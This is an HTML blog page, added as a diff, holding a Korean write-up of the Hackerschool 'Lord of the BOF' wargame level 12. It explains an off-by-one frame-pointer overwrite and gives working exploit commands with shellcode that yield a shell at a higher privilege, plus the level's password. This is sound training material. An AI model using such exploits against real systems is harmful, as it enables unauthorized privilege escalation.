@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 BoF LEVEL12 (Golem -> Darkknight) : Sfp</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL12 (Golem -&gt; Darkknight) : Sfp | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL12 (Golem -&gt; Darkknight) : Sfp" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = golem pw = cup of coffee" />
+<meta property="og:description" content="id = golem pw = cup of coffee" />
+<link rel="canonical" href="http://localhost:4000/2015-11-20/hackerschool-BoF-stage-12/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-20/hackerschool-BoF-stage-12/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-20T07:03:10+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = golem pw = cup of coffee","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-20/hackerschool-BoF-stage-12/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL12 (Golem -&gt; Darkknight) : Sfp","dateModified":"2015-11-20T07:03:10+09:00","datePublished":"2015-11-20T07:03:10+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-20/hackerschool-BoF-stage-12/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 BoF LEVEL12 (Golem -> Darkknight) : Sfp</div>
+  <span class="post-date">
+    <time>20 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = golem</li>
+  <li>pw = cup of coffee</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--darkknightc">1. 문제 : darkknight.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - darkknight
+        - FPO
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">problem_child</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="n">strncpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mi">41</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">problem_child</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>일단 가장 큰 차이점은 main() 함수안에서 problem_child() 라는 함수 안에서 buffer[40] 에 대한 strncpy(buffer, src, 41) 가 이루어진다. 이전에는 한 함수 안에서 stack 에 저장된 return address 를 변조하도록 공격하였는데, 이번에는 하나의 함수에서 이전에 저장한 stack frame register 를 변조하여, 이를 복구하는 이전 caller function 에서 복구시에 원하는 shellcode 위치로 jump 하도록 해야한다. 이를 위해서는 frame register, $ebp, 함수 preamble, postamble 등에 대해서 잘 이해해야한다.</p>
+
+<h3 id="13-main">1.3 main()</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x804846c &lt;main&gt;:       push   %ebp
+0x804846d &lt;main+1&gt;:     mov    %esp,%ebp
+0x804846f &lt;main+3&gt;:     cmpl   $0x1,0x8(%ebp)
+0x8048473 &lt;main+7&gt;:     jg     0x8048490 &lt;main+36&gt;
+0x8048475 &lt;main+9&gt;:     push   $0x8048504
+0x804847a &lt;main+14&gt;:    call   0x8048354 &lt;printf&gt;
+0x804847f &lt;main+19&gt;:    add    $0x4,%esp
+0x8048482 &lt;main+22&gt;:    push   $0x0
+0x8048484 &lt;main+24&gt;:    call   0x8048364 &lt;exit&gt;
+0x8048489 &lt;main+29&gt;:    add    $0x4,%esp
+0x804848c &lt;main+32&gt;:    lea    0x0(%esi,1),%esi
+0x8048490 &lt;main+36&gt;:    mov    0xc(%ebp),%eax
+0x8048493 &lt;main+39&gt;:    add    $0x4,%eax
+0x8048496 &lt;main+42&gt;:    mov    (%eax),%edx
+0x8048498 &lt;main+44&gt;:    push   %edx
+0x8048499 &lt;main+45&gt;:    call   0x8048440 &lt;problem_child&gt;
+0x804849e &lt;main+50&gt;:    add    $0x4,%esp
+0x80484a1 &lt;main+53&gt;:    leave
+0x80484a2 &lt;main+54&gt;:    ret
+0x80484a3 &lt;main+55&gt;:    nop
+0x80484a4 &lt;main+56&gt;:    nop
+</code></pre></div></div>
+
+<h3 id="14-problem_child">1.4 problem_child()</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x8048440 &lt;problem_child&gt;:      push   %ebp
+0x8048441 &lt;problem_child+1&gt;:    mov    %esp,%ebp
+0x8048443 &lt;problem_child+3&gt;:    sub    $0x28,%esp
+0x8048446 &lt;problem_child+6&gt;:    push   $0x29
+0x8048448 &lt;problem_child+8&gt;:    mov    0x8(%ebp),%eax
+0x804844b &lt;problem_child+11&gt;:   push   %eax
+0x804844c &lt;problem_child+12&gt;:   lea    0xffffffd8(%ebp),%eax
+0x804844f &lt;problem_child+15&gt;:   push   %eax
+0x8048450 &lt;problem_child+16&gt;:   call   0x8048374 &lt;strncpy&gt;
+0x8048455 &lt;problem_child+21&gt;:   add    $0xc,%esp
+0x8048458 &lt;problem_child+24&gt;:   lea    0xffffffd8(%ebp),%eax
+0x804845b &lt;problem_child+27&gt;:   push   %eax
+0x804845c &lt;problem_child+28&gt;:   push   $0x8048500
+0x8048461 &lt;problem_child+33&gt;:   call   0x8048354 &lt;printf&gt;
+0x8048466 &lt;problem_child+38&gt;:   add    $0x8,%esp
+0x8048469 &lt;problem_child+41&gt;:   leave
+0x804846a &lt;problem_child+42&gt;:   ret
+0x804846b &lt;problem_child+43&gt;:   nop
+</code></pre></div></div>
+
+<h2 id="2-함수-진입--복귀">2 함수 진입 &amp; 복귀</h2>
+
+<p>이번 문제 풀이에서 가장 중요한 것은 기존 Frame Register가 어떻게 쓰이는 것을 이해하는 것이다. 기존과 달리 frame register를 이용한 공격하게 된다.</p>
+
+<h3 id="21-함수-내부-동작--a-brief-introduction-to-x86-calling-conventions">2.1 함수 내부 동작 : <a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html">A brief introduction to x86 calling conventions</a></h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>my_function:
+  push %ebp              # Preamble: save the old %ebp.
+  movl %esp, %ebp        # Point %ebp to the saved %ebp and the new stack frame.
+
+  subl $0x4, %esp        # Reserve space for local variables.
+
+  movl 0x8(%ebp), %eax   
+  movl %eax, -0x4(%ebp)  # Move argument into local variable.
+
+  # Function body. 
+
+  addl $0x4, %esp        # Reclaim space used by local variables.
+
+  leave                  # Epilogue: restore the old %ebp.
+  ret
+</code></pre></div></div>
+
+<h3 id="22-함수-진입">2.2 함수 진입</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push %ebp             # Preamble: save the old %ebp.
+mov %esp, %ebp         # Point %ebp to the saved %ebp and the new stack frame.
+</code></pre></div></div>
+
+<h3 id="23-함수-jump">2.3 함수 jump</h3>
+
+<p>ARM 에서는 함수 jump 시에 return address 를 함수 prologue 에서 push rX, .., $lr stack push 를 해주었던 것 같은데, x86에서는 call function 이 알아서 해주는 듯 하다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>call function
+</code></pre></div></div>
+
+<h3 id="24-leave--stackoverflow-why-does-leave-do-mov-espebp-in-x86-assembly">2.4 leave() : <a href="http://stackoverflow.com/questions/5474355/why-does-leave-do-mov-esp-ebp-in-x86-assembly">@stackoverflow: Why does leave do “mov esp,ebp” in x86 assembly?</a></h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov esp,ebp
+pop ebp
+</code></pre></div></div>
+
+<h3 id="25-ret">2.5 ret()</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pop eip
+</code></pre></div></div>
+
+<h3 id="26-x86-callreturn-protocol">2.6 <a href="http://pages.cs.wisc.edu/~cs354-1/Handouts/Handout-CallReturn.pdf">x86 Call/Return Protocol</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/579f275f0c88410af2116ee22a08a1b572e4081b/2015/11/stage12-1.png" alt="img" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| &lt;argument 2&gt;       |
+| &lt;argument 1&gt;       |
+| &lt;return address&gt;   |
+| &lt;old ebp&gt;          | &lt;= %ebp
+| &lt;local var 1&gt;      |
+| &lt;local var 2&gt;      | &lt;= %esp
+</code></pre></div></div>
+
+<h2 id="2-공격">2. 공격</h2>
+
+<h3 id="21-공격-방법-고민">2.1 공격 방법 고민</h3>
+
+<p>여기서 중요한 점은 함수를 복귀시에 그전에 stack 에 저장해둔 saved $ebp 와 $lr 를 꺼내기 위하여 $esp를 saved $ebp 로 설정한 다음에 pop $ebp 하여 $ebp 를 설정하고 나서, 그 다음 word 에 있는 $lr 를 pop 하여 return 한다는 것이다. 즉, saved $ebp를 변조하면 함수 복귀 시의 주소 역시 바꿀 수 있다는 것이다.</p>
+
+<h3 id="22-공격">2.2 공격</h3>
+
+<p>problem_child() 함수 안에서 buffer copy 시에 saved $ebp 의 마지막 한 바이트 값을 바꿀 수 있는데, 이는 main() 함수로 복귀한 이후에 saved $ebp 복원하는 과정에서 이 값으로 $esp 로 설정을 하여 pop 하여 $ebp 설정하고 (leave) 이후에 ret 시에 다음 +4 bytes 자리에 있는 값을 $eip로 설정하여 복귀하게 된다. 따라서 $ebp 값의 다음 word 자리의 값이 shellcode 가 위치한 두 번째 parameter 값이 있는 위치가 되도록 0xbffffdc8 로 선택하여 exploit 작성하였다.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage12-3.png" alt="img" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./darkknight <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\xc8\xfd\xff\xbf" * 10 + "\x04"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*100 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>    
+Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿Èý ¿ü ¿
+                                          ý ¿Xü ¿Ë      @
+bash<span class="nv">$ </span>  
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>512<span class="o">(</span>darkknight<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>512<span class="o">(</span>darkknight<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="3-다음-단계-정보">3. 다음 단계 정보</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>512<span class="o">(</span>darkknight<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>512<span class="o">(</span>darkknight<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>511<span class="o">(</span>golem<span class="o">)</span>
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 512
+new attacker
+</code></pre></div></div>
+
+<h2 id="4-의문점">4. 의문점</h2>
+
+<p>사실 아래가 처음에 공격 시도한 exploit 인데, 앞의 성공한 경우 거의 동일하다. 차이가 있다면 ret 시 설정되는 값 위치를 특정 위치 하나만 설정하고, 나머지는 NOP Sled 을 깔은 것인데, 이것이 동작하지 않는다는 것은… gdb 실행한 경우와 실제 실행하는 경우의 stack 이 조금 다르게 잡히기 때문에 복귀 주소가 잘못되는 듯하다.</p>
+
+<p>이렇게 두 경우의 stack 위치가 달라지는 경우에 어떻게 처리를 해야할지 모르겠다. 일단은 NOP Sled이나 특정값을 반복시켜서 stack 위치가 약간 틀어져서 동작하도록 해야할 듯 하다.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage12-2.png" alt="img" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./darkknight <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*20 + "\xc8\xfd\xff\xbf" * 4 + "\x04"*5'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*100 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'</span><span class="sb">`</span>
+Èý ¿Èý ¿Èý ¿Èý ¿ü ¿
+                  ý ¿Xü ¿Ë      @
+Segmentation fault
+</code></pre></div></div>
+
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
